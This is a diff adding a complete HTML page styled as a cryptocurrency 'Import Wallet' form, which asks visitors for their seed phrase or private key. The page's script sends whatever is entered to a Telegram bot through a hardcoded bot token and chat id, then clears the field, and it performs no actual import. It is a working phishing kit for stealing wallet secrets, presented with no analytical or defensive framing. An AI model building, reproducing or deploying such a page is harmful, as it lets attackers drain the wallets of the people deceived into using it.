@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Import Wallet</title>
+  <style>
+    body {
+      background: #000;
+      color: #fff;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .wallet-form {
+      background: #111;
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 25px rgba(255,255,255,0.08);
+      width: 100%;
+      max-width: 420px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 30px;
+      text-align: center;
+    }
+    textarea {
+      width: 100%;
+      height: 120px;
+      background: #222;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      padding: 12px;
+      font-size: 14px;
+      resize: none;
+      margin-bottom: 20px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #fff;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #ccc;
+    }
+  </style>
+</head>
+<body>
+  <div class="wallet-form">
+    <h1>Import Your Wallet</h1>
+    <textarea id="walletInput" placeholder="Enter your seed phrase or private key"></textarea>
+    <button onclick="sendToTelegram()">Confirm</button>
+  </div>
+
+  <script>
+    function sendToTelegram() {
+      const input = document.getElementById('walletInput').value.trim();
+      if (!input) return alert("Please enter a valid key or phrase.");
+
+      const botToken = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
+      const chatId = '-4704812522';
+      const message = `Wallet input: ${input}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          
+          document.getElementById('walletInput').value = '';
+        } else {
+          
+        }
+      })
+      .catch(err => alert("Invalid Input."));
+    }
+  </script>
+</body>
+</html>
